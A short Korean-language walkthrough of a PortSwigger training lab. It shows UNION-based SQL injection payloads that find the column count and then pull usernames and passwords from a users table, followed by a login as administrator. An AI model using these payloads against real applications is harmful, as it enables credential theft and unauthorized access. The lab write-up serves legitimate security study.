# [PortSwigger]SQL Injection 05

https://portswigger.net/web-security/all-labs

## LAB
SQL 삽입 UNION 공격, 다른 테이블에서 데이터 검색

## Qusetion
이 연구소에는 제품 범주 필터에 SQL 삽입 취약점이 포함되어 있습니다. 쿼리의 결과는 응용 프로그램의 응답으로 반환되므로 UNION 공격을 사용하여 다른 테이블에서 데이터를 검색할 수 있습니다. 이러한 공격을 구성하려면 이전 실습에서 배운 몇 가지 기술을 결합해야 합니다.

데이터베이스에는 및 users라는 열이 있는 이라는 다른 테이블이 있습니다 . ***username password***

랩을 해결하려면 모든 사용자 이름과 암호를 검색 하는 SQL 주입 UNION ***administrator*** 공격을 수행하고 해당 정보를 사용하여 사용자로 로그인합니다.

## Solution

제품 범주 필터에 Union SQL Injection 취약점 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2005%20-%201.png)

<br>

category 파라미터에 취약점 확인
```
' union select null --
' union select null,null --
```

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2005%20-%202.png)

<br>

컬럼 갯수 2개 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2005%20-%203.png)

<br>

users 테이블의 username password 컬럼 조회

admin 아이디 비밀번호 획득

```
' union select username, password from users --
```

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2005%20-%204.png)

<br>

admin 계정으로 로그인 시도

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2005%20-%205.png)

<br>

admin 계정으로 로그인 성공 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2005%20-%206.png)